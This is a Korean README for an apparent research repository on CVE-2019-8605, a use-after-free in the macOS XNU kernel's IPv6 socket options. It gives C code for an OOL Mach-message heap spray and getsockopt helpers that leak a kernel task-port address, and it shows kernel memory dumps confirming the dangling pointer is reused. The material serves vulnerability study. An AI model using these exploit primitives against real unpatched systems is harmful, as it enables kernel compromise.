# dangling_kptr_reuse (CVE-2019-8605)
## 환경
macOS 10.14.1 x86_64 ([net.siguza.hsp4.kext](https://github.com/Siguza/hsp4/tree/master) 필요)

## 설명 및 개념 증명
CVE-2019-8605 취약점에 대해 간략히 소개하자면,<br>
ip6_freepcbopts 함수를 통해 inp->in6p_outputopts가 해제되지만,<br>
NULL로 설정되지 않아 여전히 해제된 메모리 영역을 가리키고 있어 dangling 포인터가 됩니다.
```c
void in6_pcbdetach(struct inpcb *inp) {
    // ...
    if (!(so->so_flags & SOF_PCBCLEARING)) {
        struct ip_moptions *imo;
        struct ip6_moptions *im6o;

        inp->inp_vflag = 0;
        if (inp->in6p_options != NULL) {
            m_freem(inp->in6p_options);
            inp->in6p_options = NULL;   // <- 올바르게 NULL 처리 (GOOD)
        }
        ip6_freepcbopts(inp->in6p_outputopts);    // <- 해제만 함, NULL 처리X (BAD)
        // 매핑된 주소의 경우 IPv4 관련 리소스 해제
        ROUTE_RELEASE(&inp->in6p_route);
        if (inp->inp_options != NULL) {
            (void)m_free(inp->inp_options);        // <- 올바르게 NULL 처리, (GOOD)
            inp->inp_options = NULL;
        }
        // ...
    }
}
```
<br>
OOL 메시지는 XNU의 프로세스 간 통신(IPC) 메커니즘에 중요하게 쓰이기도 하며,

메시지를 수신하기 전까지 계속 커널 공간에 남아두게 만들 수 있는 특징이 있습니다.

이러한 OOL 메시지를 통해서 ipc_port 구조체의 커널 주소를 inp->in6p_outputopts에 할당하게끔 힙 스프레이를 수행합니다.

XNU에서의 커널 할당은 존(zone)이라는 일련의 영역을 사용합니다. 이러한 존은 특정 크기나 유형의 객체만을 포함하는 힙 메모리의 구역입니다. 예를 들어, kalloc.32 존은 크기가 32바이트 이하인 객체들을 포함하며, dangling되는 구조체 ip6_pktopts의 크기는 192이기에, kalloc.192라는 존에 속합니다.
따라서 아래 함수로 힙스프레이할 때, count 매개변수는 `192/sizeof(uint64_t)` 여야 합니다.
```c
mach_port_t fill_kalloc_with_port_pointer(mach_port_t target_port, int count, int disposition) {
    mach_port_t q = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &q);
    if (err != KERN_SUCCESS) {
        printf("[-] failed to allocate port\n");
        return 0;
    }

    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++) {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = q;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   msg->hdr.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS) {
        printf("[-] failed to send message: %s\n", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    
    return q;
}
```

힙 스프레이가 수행되면 커널에서 내부적으로 
```c
mach_msg_overwrite_trap 
-> ipc_kmsg_copyin 
-> ipc_kmsg_copyin_body 
-> ipc_kmsg_copyin_ool_ports_descriptor 
-> ipc_object_copyin 
-> ipc_right_lookup_write 
-> ipc_entry_lookup
```
함수가 순차적으로 호출됩니다.

여기서 `ipc_entry_lookup` 함수에 의해 Task Port의 커널 모드 주소로 변환해주기 때문에 아래와 같이 192바이트의 task port들이 스프레이됩니다.

```c
ipc_entry_t
ipc_entry_lookup(
 ipc_space_t space,
 mach_port_name_t name)
{
 mach_port_index_t index;
 ipc_entry_t entry;
 index = MACH_PORT_INDEX(name);
 if (index < space->is_table_size) {
 entry = &space->is_table[index];
 ...
 }
 return entry;
}
```
- 스프레이된 task port 커널 주소들
```
[0xffffff80141cf040+0x000] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x010] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x020] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x030] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x040] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x050] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x060] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x070] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x080] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x090] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x0a0] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x0b0] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
```

댕글링되는 192바이트의 커널 구조체는 아래와 같으며, 
```c
struct ip6_pktopts {
    struct mbuf         *ip6po_m;
    int                  ip6po_hlim;
    **struct in6_pktinfo  *ip6po_pktinfo;**
    struct ip6po_nhinfo  ip6po_nhinfo;
    struct ip6_hbh      *ip6po_hbh;
    struct ip6_dest     *ip6po_dest1;
    struct ip6po_rhinfo  ip6po_rhinfo;
    struct ip6_dest     *ip6po_dest2;
    **int                  ip6po_tclass;**
    **int                  ip6po_minmtu;**
    **int                  ip6po_prefer_tempaddr;**
    int                  ip6po_flags;
};
```
이제 사용자 환경에서 `ip6po_minmtu, ip6po_prefer_tempaddr` 필드를 읽어옴으로써 task port leak이 가능합니다.
```c
int get_minmtu(int sock, int *minmtu) {
    socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

int get_prefertempaddr(int sock, int *prefertempaddr) {
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}
```

이렇게 dangling되는 커널 포인터를 재사용하여 leak시키는 방법에 대해 알아보았습니다.

이 레포지토리는 dangling 커널 포인터가 <b>실제로 재사용하는지</b>에 대해 알아봅니다.<br>
Siguza 개발자분의 hsp4 커널 확장을 사용하면, 별도의 취약점없이 커널 읽기/쓰기가 가능합니다.

socket 파일 디스크립터에서부터 할당된 192바이트의 `ip6_pktopts` 구조체 커널 주소를 가져올 수 있으며,<br>
ool ports 또한 `ikmq_base`, `ikm_header` 필드에 접근함으로써 할당된 192바이트의 `mach_msg_ool_ports_descriptor_t`의 `address`를 가져올 수 있습니다.

여기서 서로 address가 일치하면 dangling 포인터가 재사용되었다는 것을 의미합니다.






```
ret: 0x0, hsp4: 0xb03
kext_name: com.apple.kec.corecrypto
kext_addr_slid: 0xffffff7f890c7000
get_kbase ret: 0, kbase: 0xffffff8008200000, kslide: 0x8000000
[*] sock_fd: 3
[*] obtained dangling_kptr from socket_fd, 0xffffff80141cf040
[*] port_kaddr: 0xffffff801a1232a0
[*] ikmq_base: 0xffffff8019b96a00
[*] DANGLING KPTR REUSED!!!!!!
=============================
[0xffffff80141cf040+0x000] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x010] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x020] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x030] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x040] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x050] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x060] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x070] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x080] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x090] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x0a0] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
[0xffffff80141cf040+0x0b0] 50 F1 68 1B 80 FF FF FF  50 F1 68 1B 80 FF FF FF  |  P.h.....P.h.....
=============================
[*] our task port: 0xffffff801b68f150
```